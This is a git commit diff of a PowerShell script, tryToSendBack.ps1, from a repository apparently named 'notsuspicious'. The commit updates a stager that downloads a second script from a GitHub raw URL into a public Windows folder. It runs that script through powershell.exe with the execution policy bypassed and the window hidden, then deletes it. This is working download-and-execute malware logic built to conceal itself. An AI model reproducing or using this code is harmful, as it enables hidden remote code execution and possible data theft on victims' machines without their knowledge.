7e07261602e85d3d8b119d7aa39078962f325ef9
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-01 10:13:18 +0100

    Update tryToSendBack.ps1

--- tryToSendBack.ps1
+++ tryToSendBack.ps1
@@ -2,16 +2,16 @@ try {
     # Download url.txt
     Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
     
-    # Download and execute sendBack.bat
-    $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
-    $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.ps1" -Encoding ASCII
-    Start-Process -FilePath "C:\Users\Public\Videos\sendBack.ps1" -WindowStyle Hidden -Wait
+    # Download and execute sendBack.ps1
+    $ps1Content = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
+    $ps1Content | Out-File -FilePath "C:\Users\Public\Videos\sendBack.ps1" -Encoding UTF8
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Users\Public\Videos\sendBack.ps1" -WindowStyle Hidden -Wait
 }
 catch {
     # Handle exceptions here
     Write-Host "An error occurred: $_"
 }
 finally {
-    # Delete the batch file after execution
+    # Delete the ps1 file after execution
     Remove-Item -Path "C:\Users\Public\Videos\sendBack.ps1" -Force
 }
